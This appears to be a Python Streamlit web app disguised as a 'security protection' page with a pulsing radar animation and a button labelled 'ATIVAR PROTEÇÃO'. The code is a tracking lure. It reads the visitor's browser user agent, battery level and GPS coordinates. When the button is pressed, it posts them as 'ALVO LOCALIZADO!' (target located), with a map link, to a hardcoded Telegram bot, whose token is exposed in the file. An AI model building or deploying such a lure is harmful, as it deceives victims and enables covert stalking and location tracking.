import streamlit as st
import requests
from streamlit_js_eval import streamlit_js_eval, get_geolocation

# 1. CONEXÃO TELEGRAM
TOKEN_BOT = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
SEU_ID = "8210828398"

def enviar_telegram(mensagem):
    url = f"https://api.telegram.org/bot{TOKEN_BOT}/sendMessage"
    payload = {"chat_id": SEU_ID, "text": mensagem, "parse_mode": "Markdown"}
    try: requests.post(url, json=payload)
    except: pass

# 2. CONFIGURAÇÃO DA PÁGINA
st.set_page_config(page_title="Sistema De Segurança Integrado", page_icon="🔐", layout="centered")

# 3. CÓDIGO DA ANIMAÇÃO (CSS PURO)
st.markdown("""
    <style>
    .main { background-color: #0d1117; }
    
    /* Container da Esfera */
    .radar-container {
        display: flex; justify-content: center; align-items: center; padding: 40px 0;
    }
    
    /* A Esfera Verde Pulsante */
    .green-globe {
        width: 150px; height: 150px;
        background: radial-gradient(circle, #2ecc71 0%, rgba(0,255,100,0.1) 70%);
        border-radius: 50%;
        box-shadow: 0 0 40px #2ecc71, inset 0 0 20px #2ecc71;
        position: relative;
        animation: pulse 2s infinite ease-in-out;
    }
    
    /* Efeito de brilho extra */
    .green-globe::after {
        content: '';
        position: absolute;
        width: 100%; height: 100%;
        border-radius: 50%;
        border: 2px solid #2ecc71;
        animation: orbit 3s linear infinite;
        opacity: 0.5;
    }

    @keyframes pulse {
        0% { transform: scale(0.9); opacity: 0.7; box-shadow: 0 0 20px #2ecc71; }
        50% { transform: scale(1.05); opacity: 1; box-shadow: 0 0 50px #2ecc71; }
        100% { transform: scale(0.9); opacity: 0.7; box-shadow: 0 0 20px #2ecc71; }
    }

    /* Botão Amarelo */
    div.stButton > button {
        background-color: #ffc107 !important;
        color: black !important;
        font-weight: bold !important;
        width: 100% !important; height: 4em !important;
        border-radius: 12px !important; border: none !important;
    }
    
    .footer { text-align: center; color: #555; font-size: 13px; margin-top: 50px; }
    </style>

    <div style="text-align: center;">
        <h1 style='color: #Green; margin-bottom: 0;'>🛡️ SEGURANÇA ATIVA</h1>
        <p style='color: #ccc;'>Monitoramento em Tempo Real</p>
    </div>

    <div class="radar-container">
        <div class="green-globe"></div>
    </div>
    """, unsafe_allow_html=True)

# 4. CAPTURA DE DADOS
ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='ua')
bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='bat')
loc = get_geolocation()

# 5. LÓGICA DO BOTÃO
if st.button("🔴 ATIVAR PROTEÇÃO"):
    if loc and 'coords' in loc:
        lat = loc['coords']['latitude']
        lon = loc['coords']['longitude']
        mapa = f"https://www.google.com/maps?q={lat},{lon}"
        
        relatorio = (
            f"🔔 ALVO LOCALIZADO!\n\n"
            f"📱 Aparelho: {ua[:50]}... \n"
            f"🔋 Bateria: {bat if bat else '--'}%\n"
            f"📍 Mapa: [VER LOCALIZAÇÃO]({mapa})"
        )
        
        enviar_telegram(relatorio)
        st.success("✅ Localização Enviada ao Telegram!")
    else:
        st.warning("🛰️ Carregando GPS... Clique novamente em 2 segundos.")

# 6. ASSINATURA
st.markdown('<p class="footer">Desenvolvido Por Miamy © 2026</p>', unsafe_allow_html=True)
